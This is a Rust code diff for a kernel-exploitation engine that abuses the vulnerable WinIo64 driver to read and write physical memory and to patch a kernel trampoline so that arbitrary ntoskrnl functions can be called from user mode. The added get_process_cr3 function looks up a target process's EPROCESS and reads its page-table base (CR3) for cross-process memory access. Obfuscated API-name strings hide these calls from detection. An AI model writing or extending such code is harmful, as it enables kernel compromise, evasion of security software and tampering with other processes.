@@ -35,7 +35,9 @@ type FnDeviceIoControl = unsafe extern "system" fn(
 ) -> BOOL;
 type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
 
-/// User-mode trampoline — matches NtShutdownSystem (1 arg, returns NTSTATUS)
+/// User-mode trampoline — matches NtShutdownSystem layout.
+/// Return type is usize (64-bit on x64) to capture full RAX from functions
+/// like MmGetPhysicalAddress that return 64-bit values.
 type FnTrampoline = unsafe extern "system" fn(
     usize,
     usize,
@@ -47,7 +49,7 @@ type FnTrampoline = unsafe extern "system" fn(
     usize,
     usize,
     usize,
-) -> i32;
+) -> usize;
 
 /// DM_KernelSyscall engine (WinIo64 backend)
 pub struct DmEngine {
@@ -242,7 +244,7 @@ impl DmEngine {
     }
 
     /// Read physical memory: map → memcpy → unmap
-    fn read_phys(&self, phys_addr: u64, buf: &mut [u8]) -> Result<(), String> {
+    pub fn read_phys(&self, phys_addr: u64, buf: &mut [u8]) -> Result<(), String> {
         let (va, ps) = self.map_phys(phys_addr, buf.len() as u64)?;
         unsafe {
             std::ptr::copy_nonoverlapping(va as *const u8, buf.as_mut_ptr(), buf.len());
@@ -525,8 +527,19 @@ impl DmEngine {
     // DM_KernelSyscall core
     // ═══════════════════════════════════════════════════════════════════════
 
-    /// Execute a kernel function by patching the trampoline
+    /// Execute a kernel function by patching the trampoline.
+    /// Returns NTSTATUS (i32) — truncated from the full usize return.
     pub unsafe fn kernel_syscall(&self, target_func: &str, args: &[usize]) -> Result<i32, String> {
+        Ok(self.kernel_syscall_raw(target_func, args)? as i32)
+    }
+
+    /// Execute a kernel function, returning the full 64-bit RAX value.
+    /// Use for functions like MmGetPhysicalAddress that return 64-bit values.
+    pub unsafe fn kernel_syscall_raw(
+        &self,
+        target_func: &str,
+        args: &[usize],
+    ) -> Result<u64, String> {
         let target_rva = Self::find_export_rva_from_disk(target_func)?;
         let target_va = self.ntos_virt_base + target_rva as u64;
 
@@ -551,7 +564,7 @@ impl DmEngine {
             (self.trampoline_user)(a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9));
 
         self.write_phys(self.trampoline_phys, &orig)?;
-        Ok(result)
+        Ok(result as u64)
     }
 
     // ═══════════════════════════════════════════════════════════════════════
@@ -665,6 +678,54 @@ impl DmEngine {
         }
 
         Ok(HANDLE(h_user as *mut _))
+    }
+
+    /// Get the CR3 (DirectoryTableBase) of a target process via kernel-mode.
+    ///
+    /// Uses PsLookupProcessByProcessId to get EPROCESS pointer,
+    /// then MmGetPhysicalAddress to translate EPROCESS+0x28 to physical address,
+    /// then reads CR3 via read_phys.
+    pub fn get_process_cr3(&self, pid: u32) -> Result<u64, String> {
+        // 1. PsLookupProcessByProcessId(pid, &eprocess_ptr)
+        let mut eprocess: usize = 0;
+        let status = unsafe {
+            self.kernel_syscall(
+                &crate::obfstr_helper::ps_lookup_process(),
+                &[pid as usize, &mut eprocess as *mut usize as usize],
+            )?
+        };
+        if status < 0 {
+            return Err(format!(
+                "PsLookupProcessByProcessId failed: 0x{:08X}",
+                status as u32
+            ));
+        }
+        println!("    [engine] EPROCESS: 0x{:X}", eprocess);
+
+        // 2. MmGetPhysicalAddress(eprocess + 0x28) → full 64-bit PHYSICAL_ADDRESS
+        //    Uses kernel_syscall_raw to capture the full 64-bit RAX return value.
+        let dtb_va = eprocess + 0x28;
+        let phys = unsafe {
+            self.kernel_syscall_raw(&crate::obfstr_helper::mm_get_physical_address(), &[dtb_va])?
+        };
+
+        // 3. ObfDereferenceObject(eprocess) — cleanup reference count
+        unsafe {
+            let _ = self.kernel_syscall(&crate::obfstr_helper::obf_deref_object(), &[eprocess]);
+        }
+
+        if phys == 0 {
+            return Err("MmGetPhysicalAddress returned 0".into());
+        }
+        println!("    [engine] DTB phys addr: 0x{:X}", phys);
+
+        // 4. Read 8 bytes at the physical address to get CR3
+        let mut cr3_buf = [0u8; 8];
+        self.read_phys(phys, &mut cr3_buf)?;
+        let cr3 = u64::from_le_bytes(cr3_buf);
+
+        println!("    [engine] CR3: 0x{:X}", cr3);
+        Ok(cr3)
     }
 
     // ═══════════════════════════════════════════════════════════════════════
